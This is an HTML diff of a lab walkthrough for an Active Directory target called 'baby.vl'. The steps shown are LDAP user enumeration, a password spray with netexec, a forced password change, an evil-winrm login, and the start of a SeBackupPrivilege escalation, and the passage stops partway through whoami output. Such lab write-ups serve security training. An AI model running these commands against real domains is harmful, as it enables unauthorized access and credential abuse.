-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="go">dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="go">dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="go">dn: CN=Domain Users,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="go">dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="go">dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="go">dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="go">dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="go">dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="go">dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="go">dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="go">dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="go">dn: CN=Protected Users,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="go">dn: CN=Key Admins,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="go">dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="go">dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="go">dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="go">dn: CN=dev,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="go">dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  </span>
-</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="go">dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  </span>
-</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="go">dn: CN=Hugh George,OU=dev,DC=baby,DC=vl  </span>
-</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="go">dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  </span>
-</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="go">dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  </span>
-</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="go">dn: CN=it,CN=Users,DC=baby,DC=vl  </span>
-</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="go">dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="go">dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="go">dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="go">dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  </span>
-</span><span id="__span-3-37"><a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉ldapsearch -x -H ldap://$ip -b &quot;DC=baby,DC=vl&quot; &quot;users&quot; | grep dn  </span>
+<span class="go">dn: DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Administrator,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Guest,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=krbtgt,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Users,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Protected Users,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Key Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=dev,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Hugh George,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=it,CN=Users,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl  </span>
+<span class="go">dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl</span>
+</code></pre></div>
 <p>Getting rid of all the groups we get the following list. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="go">〉cat users.txt  </span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="go">administrator  </span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="go">guest  </span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="go">jacqueline.barnett  </span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="go">ashley.webb  </span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="go">hugh.george  </span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="go">leonard.dyer  </span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="go">ian.walker  </span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="go">connor.wilkinson  </span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="go">caroline.robinson  </span>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="go">joseph.hughes  </span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="go">kerry.wilson  </span>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="go">teresa.bell</span>
-</span></code></pre></div>
-<h2 id="foothold">Foothold</h2>
+<div class="highlight"><pre><span></span><code><span class="go">〉cat users.txt  </span>
+<span class="go">administrator  </span>
+<span class="go">guest  </span>
+<span class="go">jacqueline.barnett  </span>
+<span class="go">ashley.webb  </span>
+<span class="go">hugh.george  </span>
+<span class="go">leonard.dyer  </span>
+<span class="go">ian.walker  </span>
+<span class="go">connor.wilkinson  </span>
+<span class="go">caroline.robinson  </span>
+<span class="go">joseph.hughes  </span>
+<span class="go">kerry.wilson  </span>
+<span class="go">teresa.bell</span>
+</code></pre></div>
+<h2 id="foothold">Foothold<a class="headerlink" href="#foothold" title="Permanent link">&para;</a></h2>
 <p>Now we can use <code>netexec</code> to spray the previously discovered password against the list of domain users. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">〉nxc smb $ip -u users.txt -p &#39;BabyStart123!&#39;  </span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\administrator:BabyStart123! STATUS_L  </span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="go">OGON_FAILURE  </span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\guest:BabyStart123! STATUS_LOGON_FAI  </span>
-</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="go">LURE  </span>
-</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STA  </span>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="go">TUS_LOGON_FAILURE  </span>
-</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOG  </span>
-</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="go">ON_FAILURE  </span>
-</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOG  </span>
-</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="go">ON_FAILURE  </span>
-</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LO  </span>
-</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="go">GON_FAILURE  </span>
-</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ian.walker:BabyStart123! STATUS_LOGO  </span>
-</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="go">N_FAILURE  </span>
-</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATU  </span>
-</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="go">S_LOGON_FAILURE  </span>
-</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
-</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="go">US_PASSWORD_MUST_CHANGE  </span>
-</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_L  </span>
-</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="go">OGON_FAILURE  </span>
-</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LO  </span>
-</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="go">GON_FAILURE  </span>
-</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOG  </span>
-</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="go">ON_FAILURE  </span>
-</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u users.txt -p &#39;BabyStart123!&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
+<span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\administrator:BabyStart123! STATUS_L  </span>
+<span class="go">OGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\guest:BabyStart123! STATUS_LOGON_FAI  </span>
+<span class="go">LURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\jacqueline.barnett:BabyStart123! STA  </span>
+<span class="go">TUS_LOGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ashley.webb:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\hugh.george:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\leonard.dyer:BabyStart123! STATUS_LO  </span>
+<span class="go">GON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\ian.walker:BabyStart123! STATUS_LOGO  </span>
+<span class="go">N_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\connor.wilkinson:BabyStart123! STATU  </span>
+<span class="go">S_LOGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
+<span class="go">US_PASSWORD_MUST_CHANGE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\joseph.hughes:BabyStart123! STATUS_L  </span>
+<span class="go">OGON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\kerry.wilson:BabyStart123! STATUS_LO  </span>
+<span class="go">GON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOG  </span>
+<span class="go">ON_FAILURE  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\:BabyStart123! STATUS_LOGON_FAILURE</span>
+</code></pre></div>
 <p>Note that we need to change caroline robinson's password. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="go">US_PASSWORD_MUST_CHANGE</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">SMB         10.10.65.95     445    BABYDC           [-] baby.vl\caroline.robinson:BabyStart123! STAT  </span>
+<span class="go">US_PASSWORD_MUST_CHANGE</span>
+</code></pre></div>
 <p>We can change it with <code>smbpasswd</code>. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="go">〉smbpasswd -r $ip -U BABY.vl/caroline.robinson  </span>
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="go">Old SMB password:  </span>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="go">New SMB password:  </span>
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="go">Retype new SMB password:  </span>
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="go">Password changed for user caroline.robinson</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉smbpasswd -r $ip -U BABY.vl/caroline.robinson  </span>
+<span class="go">Old SMB password:  </span>
+<span class="go">New SMB password:  </span>
+<span class="go">Retype new SMB password:  </span>
+<span class="go">Password changed for user caroline.robinson</span>
+</code></pre></div>
 <p>Once the password is changed, we can confirm it with <code>netexec</code>. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="go">〉nxc smb $ip -u caroline.robinson -p &#39;P@ssw0rd123!&#39;  </span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\caroline.robinson:P@ssw0rd123!</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉nxc smb $ip -u caroline.robinson -p &#39;P@ssw0rd123!&#39;  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BA  </span>
+<span class="go">BYDC) (domain:baby.vl) (signing:True) (SMBv1:False)  </span>
+<span class="go">SMB         10.10.65.95     445    BABYDC           [+] baby.vl\caroline.robinson:P@ssw0rd123!</span>
+</code></pre></div>
 <p>Perfect! Now that we have a valid credential for the <code>caroline.robinson</code> user, we can log into the machine with <code>evil-winrm</code>. </p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="go">〉evil-winrm -i $ip -u &#39;caroline.robinson&#39; -p &#39;P@ssw0rd123!&#39;  </span>
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="go">                                          </span>
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="go">Evil-WinRM shell v3.5  </span>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="go">                                          </span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() functi  </span>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="go">on is unimplemented on this machine  </span>
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="go">                                          </span>
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remot  </span>
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="go">e-path-completion  </span>
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="go">                                          </span>
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="go">Info: Establishing connection to remote endpoint  </span>
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt;</span>
-</span></code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="go">〉evil-winrm -i $ip -u &#39;caroline.robinson&#39; -p &#39;P@ssw0rd123!&#39;  </span>
+<span class="go">                                          </span>
+<span class="go">Evil-WinRM shell v3.5  </span>
+<span class="go">                                          </span>
+<span class="go">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() functi  </span>
+<span class="go">on is unimplemented on this machine  </span>
+<span class="go">                                          </span>
+<span class="go">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remot  </span>
+<span class="go">e-path-completion  </span>
+<span class="go">                                          </span>
+<span class="go">Info: Establishing connection to remote endpoint  </span>
+<span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt;</span>
+</code></pre></div>
 <p>Grab the user flag and start enumerating. </p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
 <p>Checking our current privileges, we find that <code>caroline.robinson</code> has the <code>SeBackupPrivilege</code> enabled. With this privilege enabled, the user can bypass file and directory restrictions for the purpose of backing them up. This privilege causes the system to grant all read access to any file, regardless of the access control list specified for the file. </p>
 <p><a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4672">4672(S) Special privileges assigned to new logon. - Windows 10 | Microsoft Learn</a></p>
-<div class="language-console highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="go">*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents&gt; whoami /all  </span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="go">USER INFORMATION  </span>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="go">----------------  </span>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="go">User Name              SID  </span>
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="go">====================== ==============================================  </span>
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="go">baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1111  </span>
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>
-</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
-</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="go">GROUP INFORMATION  </span>
-</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="go">-----------------  </span>
-</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>
-</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="go">Group Name                                 Type             SID                                       </span>
-</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="go">      Attributes  </span>
-</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="go">========================================== ================ ========================================  </span>
-</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="go">====== ==================================================  </span>
-</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="go">Everyone                                   Well-known group S-1-1-0                                   </span>
-</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="go">BUILTIN\Backup Operators                   Alias            S-1-5-32-551                              </span>
-</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="go">      Mandatory group, Enabled by default, Enabled group  </span>
-</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="go">BUILTIN\Users                              Alias            S-1-5-32-545                              </span>
